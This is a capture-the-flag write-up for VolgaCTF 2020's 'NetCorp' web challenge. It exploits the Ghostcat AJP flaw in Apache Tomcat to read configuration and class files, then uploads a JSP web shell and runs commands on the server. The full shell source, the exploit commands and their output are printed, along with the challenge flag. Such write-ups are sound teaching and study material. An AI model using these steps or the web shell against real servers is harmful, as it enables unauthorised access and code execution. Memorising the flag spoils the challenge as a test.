# NetCorp
### Category: web
### Description:
Another telecom provider. Hope these guys prepared well enough for the network load...

netcorp.q.2020.volgactf.ru

### Solution:
In this challenge all we get is a URL to a page [this one](index.html), there is nothing in this website that can be spotted from here except for a folder name `resources` that stores images and other stuff. No robots.txt, no backup, nothing. Using dirb on the site we get some juicy information:

```bash
---- Scanning URL: http://netcorp.q.2020.volgactf.ru:7782/ ----
+ http://netcorp.q.2020.volgactf.ru:7782/docs (CODE:302|SIZE:0)
+ http://netcorp.q.2020.volgactf.ru:7782/examples (CODE:302|SIZE:0)
+ http://netcorp.q.2020.volgactf.ru:7782/index.html (CODE:200|SIZE:2684)
+ http://netcorp.q.2020.volgactf.ru:7782/resources (CODE:302|SIZE:0)
+ http://netcorp.q.2020.volgactf.ru:7782/uploads (CODE:302|SIZE:0)
```

Whenever we visited `examples` and `docs` we gained an important information: the server is under Apache Tomcat so we googled about known CVE and there is one from a month ago: **Ghostcat**.

How the vuln works? Basically if there is an AJP port exposed we can reach a LFI and if we can upload arbitrary files we can even reach RCE. Let's run nmap:

```bash
0/tcp    filtered unknown
22/tcp   open     ssh
135/tcp  filtered msrpc
137/tcp  filtered netbios-ns
138/tcp  filtered netbios-dgm
139/tcp  filtered netbios-ssn
445/tcp  filtered microsoft-ds
7782/tcp open     unknown
8009/tcp open     ajp13
9090/tcp open     zeus-admin
```
There is an AJP port opened. So let's try if the server is effectively unpatched, for this we've used one of the poc that you can find on github: [AJPShooter](https://github.com/00theway/Ghostcat-CNVD-2020-10487)

```bash
python3 ajpShooter.py http://netcorp.q.2020.volgactf.ru:7782 8009 /WEB-INF/web.xml read
```
BOOM, the server is affected by the vuln! [response](web.xml)

From this file we can understand a couple of things:
```xml
<servlet>
  	<servlet-name>ServeScreenshot</servlet-name>
  	<display-name>ServeScreenshot</display-name>
  	<servlet-class>ru.volgactf.netcorp.ServeScreenshotServlet</servlet-class>
  </servlet>
  
  <servlet-mapping>
  	<servlet-name>ServeScreenshot</servlet-name>
  	<url-pattern>/ServeScreenshot</url-pattern>
  </servlet-mapping>


	<servlet>
		<servlet-name>ServeComplaint</servlet-name>
		<display-name>ServeComplaint</display-name>
		<description>Complaint info</description>
		<servlet-class>ru.volgactf.netcorp.ServeComplaintServlet</servlet-class>
	</servlet>

	<servlet-mapping>
		<servlet-name>ServeComplaint</servlet-name>
		<url-pattern>/ServeComplaint</url-pattern>
	</servlet-mapping>
```
Basically there are two webapps running on this tomcat installation: `ServeComplaint` and `ServeScreenshot`, to dump the file we need to understand where the java class files are stored: in the above file there is the tag `servlet-class` which gives us the name but no directory. Checking the tomcat docs we can find that the class are placed in the `/WEB-INF/classes` directory so let's exfiltrate the source code with:
```bash
python3 ajpShooter.py http://netcorp.q.2020.volgactf.ru:7782 8009 /WEB-INF/classes/ru/volgactf/netcorp/ServeScreenshotServlet.class read -o ServeScreenshotServlet.class

python3 ajpShooter.py http://netcorp.q.2020.volgactf.ru:7782 8009 /WEB-INF/classes/ru/volgactf/netcorp/ServeComplaintServlet.class read -o ServeComplaintServlet.class
```
To check the content you can use `file` which should output:
```bash
ServeComplaintServlet.class: compiled Java class data, version 52.0 (Java 1.8)
```

Let's reverse both class files with jd-gui: [ServeComplaintServlet](ServeComplaintServlet.java) is basically empty but [ServeScreenshotServlet](ServeScreenshotServlet.java) gives us the ability to upload file on the server, we have all the prerequisites for the RCE vuln, let's exploit!

Firstly we need to create a jsp file to execute shell commands:
```jsp
<%@ page import="java.util.*,java.io.*"%>
<%
%>
<HTML>
    <BODY>
        <pre>
        <%
            String command = "<command>";
            out.println("Command: " + command + "<BR>");
            Process p;
            if ( System.getProperty("os.name").toLowerCase().indexOf("windows") != -1){
                p = Runtime.getRuntime().exec("cmd.exe /C " + command);
            }
            else{
                p = Runtime.getRuntime().exec(command);
            }
            OutputStream os = p.getOutputStream();
            InputStream in = p.getInputStream();
            DataInputStream dis = new DataInputStream(in);
            String disr = dis.readLine();
            while ( disr != null ) {
            out.println(disr);
            disr = dis.readLine();
            }
        %>
    </pre>
    </BODY>
</HTML>
```
I'll use `ls` command in first place to understand what is in the directory, we can upload it with a basic html form:
```html
<html>
<body>
   
    <form action="http://netcorp.q.2020.volgactf.ru:7782/ServeScreenshot" method="post" enctype="multipart/form-data">
        <input type="file" name="filename">
        <input type="submit" value="true">
    </form>

</body>
</html>
```

Once the response is `{'success':'true'}` we succesfully uploaded the file, we can calculate the filename with python hashlib:
```bash
python3 -c "import hashlib; print(hashlib.md5(b'shell.jsp').hexdigest())"
797cc99954a3c1a3dddeed68bb4377af
```
let's trigger the rce with:
```bash
python3 ajpShooter.py http://netcorp.q.2020.volgactf.ru:7782 8009 /uploads/797cc99954a3c1a3dddeed68bb4377af eval
```
We got the list of files, the RCE is working:
```html
<HTML>
    <BODY>
        <pre>
        Command: ls<BR>
17pekog1
17pekog1.1
17pekog1.2
17pekog1.3
17pekog1.4
BUILDING.txt
CONTRIBUTING.md
LICENSE
NOTICE
README.md
RELEASE-NOTES
RUNNING.txt
Runner34496.jar
bin
cmd.jsp
conf
curl
delta.jsp
delta.jsp.1
flag.txt
index.html
index.html.1
index.html.10
index.html.11
index.html.12
index.html.13
index.html.14
index.html.15
index.html.16
index.html.17
index.html.18
index.html.2
index.html.3
index.html.4
index.html.5
index.html.6
index.html.7
index.html.8
index.html.9
lib
lll
logs
temp
uipnopui
uipnopui.1
uipnopui.2
uipnopui.3
uipnopui.4
uipnopui.5
webapps
work

    </pre>
    </BODY>
</HTML>
```

the flag file is here, we just need to repeat the process with `cat flag.txt` command instead of ls and we should get the flag!

### Flag:
```
VolgaCTF{qualification_unites_and_real_awesome_nothing_though_i_need_else}
```